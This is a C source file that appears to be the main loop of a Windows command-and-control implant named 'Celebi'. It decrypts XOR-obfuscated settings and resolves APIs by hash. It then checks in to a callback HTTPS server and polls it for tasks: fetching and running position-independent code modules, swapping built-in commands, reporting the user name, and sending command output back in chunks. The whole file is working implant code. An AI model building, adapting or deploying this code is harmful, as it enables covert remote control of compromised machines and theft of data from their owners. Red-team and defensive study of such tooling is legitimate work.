#include <windows.h>
#include "headers/celebi.h"
#include "headers/tcg.h"
#include "headers/HTTP.h"

char ENC_PARAMS[1024] __attribute__((section(".text")));
char XORKEY[128]      __attribute__((section(".text")));

WINBASEAPI HANDLE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
WINBASEAPI LPVOID WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(	HANDLE hHandle, DWORD dwMilliseconds);
WINBASEAPI VOID WINAPI KERNEL32$ExitProcess(UINT uExitCode);
WINBASEAPI VOID WINAPI KERNEL32$ExitThread(DWORD dwExitCode);

WINBASEAPI size_t MSVCRT$strlen(const char *str);
WINBASEAPI int MSVCRT$strcmp(const char *string1, const char *string2);
WINBASEAPI char *MSVCRT$strtok(char *strToken, const char *strDelimit);

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);

FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

FARPROC resolve_unloaded(char * mod, char * func) {
	HANDLE hModule = KERNEL32$GetModuleHandleA(mod);
	if (hModule == NULL) {
		hModule = KERNEL32$LoadLibraryA(mod);
	}
	return KERNEL32$GetProcAddress(hModule, func);
}

void agent_post(AgentState *state, TaskInfo *task, char *output, char *success) {
	TaskPostReply reply = { 0 };
	BOOL result;
	
	size_t out_len = MSVCRT$strlen(output);
	
	// If the message is short, just send it.
	if (out_len <= MAXIMUM_POST_SIZE) {
		result = perform_post(state, task, &reply, output, success);
		
		#ifdef CELEBI_DEBUG
		if (result == TRUE && reply.success == 1) {
			dprintf("Server acknowledged posted command output.");
		}
		#endif
		
		return;
	}
	
	// Otherwise, break it up into chunks.
	for (int i = 0; i < out_len; i += MAXIMUM_POST_SIZE) {
		int next_len = i + MAXIMUM_POST_SIZE < out_len ? MAXIMUM_POST_SIZE : (out_len - i);
		char *next = KERNEL32$VirtualAlloc(0, next_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
		for (int j = 0; j < next_len; j++) {
			next[j] = output[i+j];
		}
		result = perform_post(state, task, &reply, next, success);
		KERNEL32$VirtualFree(next, 0, MEM_RELEASE);
		
		#ifdef CELEBI_DEBUG
		if (result == TRUE && reply.success == 1) {
			dprintf("Server acknowledged posted command output.");
		}
		#endif
	}
}

void agent_exit(AgentState *state, TaskInfo *task) {
	if (task != NULL) {
		agent_post(state, task, "", "success");
	}

	HttpDestroy(state->http);
	free_params(&state->params);
	free_vault(&state->file_vault);
	
	#ifdef CELEBI_EXIT_THREAD
	KERNEL32$ExitThread(0);
	#else
	KERNEL32$ExitProcess(0);
	#endif
}

void agent_whoami(AgentState *state, TaskInfo *task) {
	ResolvedPico pico = { 0 };
	BOOL result = resolve_loaded_pico(&state->file_vault, &state->funcs, &pico, state->builtin_picos.whoami);
	
	if (result == FALSE) {
		#ifdef CELEBI_DEBUG
		dprintf("Failed to resolve '%s' PICO", state->builtin_picos.whoami);
		#endif
		
		agent_post(state, task, "failed to resolve PICO", "error: failed to resolve PICO");
		return;
	}
	
	WHOAMI_PICO entrypoint = (WHOAMI_PICO) pico.entrypoint;
	char *username = entrypoint();
	
	if (username != NULL) {
		agent_post(state, task, username, "success");
	} else {
		agent_post(state, task, "<UNKNOWN>", "success");
	}
	
	free_resolved_pico(&pico);
}

void agent_register(AgentState *state, TaskInfo *task) {
	if (task->parameters[0] == 0x09 || MSVCRT$strlen(task->parameters) == 0) {
		agent_post(state, task, "no filename provided", "error: no filename provided");
		return;
	}

	char *name = MSVCRT$strtok(task->parameters, "\t");
	char *uuid = MSVCRT$strtok(NULL, "\t");
	
	if (is_in_vault(&state->file_vault, name) == TRUE) {
		agent_post(state, task, "duplicate filename", "error: duplicate filename");
		return;
	}

	UploadManager upload = initialise_upload_manager(state->params.callback_uuid, task->id, uuid);
	
	while (upload.finished == FALSE) {
		BOOL result = perform_upload(state, &upload);
		if (result == FALSE) {
			upload.error = TRUE;
			break;
		}
	}
	
	#ifdef CELEBI_DEBUG
	if (upload.error == FALSE) {
		dprintf("Retrieved a file from server, final size: %u", upload.buflen);
	} else {
		dprintf("Failed to retrieve a file from the server");
	}
	#endif

	if (upload.error == TRUE) {
		agent_post(state, task, "upload failed", "error: upload failed");
	} else if (add_to_vault(&state->file_vault, name, upload.current_buffer, upload.buflen) == TRUE) {
		agent_post(state, task, name, "success");
	} else {
		agent_post(state, task, "vault full", "error: vault full");
	}
	
	free_upload_manager(&upload);
}

void agent_unregister(AgentState *state, TaskInfo *task) {
	char *name = task->parameters;
	
	BOOL result = remove_from_vault(&state->file_vault, name);
	
	#ifdef CELEBI_DEBUG
	if (result == FALSE) {
		dprintf("Failed to remove '%s' from vault", name);
	} else {
		dprintf("Successfully removed '%s' from vault", name);
	}
	#endif
	
	if (result == TRUE) {
		agent_post(state, task, "removed from vault", "success"); 
	} else {
		agent_post(state, task, "could not remove from vault", "error: removal failed");
	}
}

void agent_execute_pico(AgentState *state, TaskInfo *task) {
	char *name = MSVCRT$strtok(task->parameters, "\t");
	char *args = MSVCRT$strtok(NULL, "\t");
	
	ResolvedPico pico = { 0 };
	BOOL result = resolve_loaded_pico(&state->file_vault, &state->funcs, &pico, name);
	
	if (result == FALSE) {
		#ifdef CELEBI_DEBUG
		dprintf("Failed to resolve '%s' PICO", name);
		#endif
		
		agent_post(state, task, "failed to resolve PICO", "error: failed to resolve PICO");
		return;
	}
	
	GENERIC_PICO entrypoint = (GENERIC_PICO) pico.entrypoint;
	char *pico_output = entrypoint(args);
	
	if (pico_output == NULL) {
		pico_output = "(no output)";
	}
	
	agent_post(state, task, pico_output, "success");
	
	free_resolved_pico(&pico);
}

void agent_morph(AgentState *state, TaskInfo *task) {
	if (task->parameters[0] == 0x09 || MSVCRT$strlen(task->parameters) == 0) {
		agent_post(state, task, "no command", "error: no command provided");
		return;
	}

	char *cmd = MSVCRT$strtok(task->parameters, "\t");
	char *pico = MSVCRT$strtok(NULL, "\t");
	
	if (is_in_vault(&state->file_vault, pico) == FALSE) {
		agent_post(state, task, "no pico with that name has been registered", "error: pico not found");
		return;
	}
	
	if (MSVCRT$strcmp(cmd, "whoami") == 0) {
		if (remove_from_vault(&state->file_vault, state->builtin_picos.whoami) == FALSE) {
			agent_post(state, task, "failed to remove old command from vault", "error: removal failed");
			return;
		}
		
		state->builtin_picos.whoami = clone_str(pico);
		agent_post(state, task, "command replaced", "success");
		return;
	}
	
	agent_post(state, task, "command not found or morph not supported", "error: command not found");
}

void process_task(TaskInfo *task, AgentState *state) {
	if (MSVCRT$strcmp(task->command, "exit") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received exit command.");
		#endif
		
		agent_exit(state, task);
		return;
	}
	
	if (MSVCRT$strcmp(task->command, "whoami") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received whoami command.");
		#endif
		
		agent_whoami(state, task);
		return;
	}
	
	if (MSVCRT$strcmp(task->command, "register") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received register command with parameters: '%s'", task->parameters);
		#endif
		
		agent_register(state, task);
		return;
	}
	
	if (MSVCRT$strcmp(task->command, "unregister") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received unregister command with parameters: '%s'", task->parameters);
		#endif
		
		agent_unregister(state, task);
		return;
	}
	
	if (MSVCRT$strcmp(task->command, "execute_pico") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received execute_pico command with parameters: '%s'", task->parameters);
		#endif
		
		agent_execute_pico(state, task);
		return;
	}
	
	if (MSVCRT$strcmp(task->command, "morph") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received morph command with parameters: '%s'", task->parameters);
		#endif
		
		agent_morph(state, task);
		return;
	}
	
	#ifdef CELEBI_DEBUG
	dprintf("UNKNOWN COMMAND %s: %s %s", task->id, task->command, task->parameters);
	#endif
}

void go() {
	AgentState state = { 0 };
	
	unpack_params(ENC_PARAMS, XORKEY, &state.params);
	
	#ifdef CELEBI_DEBUG
	dprintf("Parameters unpacked.");
	#endif
	
	state.file_vault = new_vault();
	
	#ifdef CELEBI_DEBUG
	dprintf("Vault allocated.");
	#endif
	
	state.funcs = resolve_pico_functions();

	#ifdef CELEBI_DEBUG
	dprintf("Resolved PICO loading functions.");
	#endif
	
	state.builtin_picos = load_builtin_picos(&state.file_vault, XORKEY);
	
	#ifdef CELEBI_DEBUG
	dprintf("Loaded PICO capabilities.");
	#endif
	
	state.http = HttpInit(state.params.callback_https);
	
	#ifdef CELEBI_DEBUG
	dprintf("Checking in...");
	#endif
	
	CheckinReply checkin_reply = { 0 };
	BOOL checkin_result = perform_checkin(&state, &checkin_reply);
	
	if ((checkin_result == FALSE) || (checkin_reply.status == NULL) || (MSVCRT$strcmp(checkin_reply.status, "success") != 0)) {
		#ifdef CELEBI_DEBUG
		dprintf("Checkin failed with: %s", checkin_reply.status);
		#endif
		
		free_checkin_reply(&checkin_reply);
		agent_exit(&state, NULL);
		return;
	}
	
	state.params.callback_uuid = clone_str(checkin_reply.callback_uuid);
	free_checkin_reply(&checkin_reply);
	
	#ifdef CELEBI_DEBUG
	dprintf("Successful checkin with payload UUID %s and callback UUID %s", state.params.payload_uuid, state.params.callback_uuid);
	#endif
	
	remove_from_vault(&state.file_vault, state.builtin_picos.checkin);
	state.builtin_picos.checkin = "(UNALLOCATED)";
	
	while (1) {
		// Look ma, no masking!
		KERNEL32$WaitForSingleObject(((HANDLE)(LONG_PTR)-1), 5000);
		
		TaskingReply tasking_reply = { 0 };
		BOOL task_result = perform_tasking(&state, &tasking_reply);
		
		#ifdef CELEBI_DEBUG
		if (task_result == TRUE) {
			dprintf("Received tasking from C2 server!");
		} else {
			dprintf("Failed to get tasking from C2 server.");
		}
		#endif
		
		if (task_result == FALSE) {
			continue;
		}
		
		for (int i = 0; i < tasking_reply.tasking_size; i++) {
			process_task(&tasking_reply.tasks[i], &state);
		}
		
		free_tasking_reply(&tasking_reply);
	}
}
